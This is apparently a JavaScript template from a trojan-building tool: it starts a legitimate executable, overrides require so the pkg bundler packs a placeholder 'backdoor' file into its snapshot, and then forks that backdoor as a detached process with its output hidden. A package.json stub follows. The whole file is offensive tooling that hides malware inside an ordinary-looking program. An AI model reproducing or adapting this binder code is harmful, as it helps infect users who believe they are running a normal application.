
module.exports.main = `
const { execFile, fork } = require('child_process')
const path = require('path')

execFile(*__execpath__*).unref()

// Overwrited the require function for allow pkg the import in the snapshot but not the execution
var require = function (str) {}
require(*__backdoor__*)

// Execute backdoor in detached mode
subprocess = fork(path.join('/snapshot/build/' , *__backdoor__*), [], { detached: true, stdio: 'ignore' })
subprocess.unref()
`

module.exports.package = {
  name: 'building',
  version: '1.0.0',
  description: '',
  main: 'temp.js',
  scripts: {
    test: 'echo "Error: no test specified" && exit 1'
  },
  author: '',
  license: 'ISC'
}
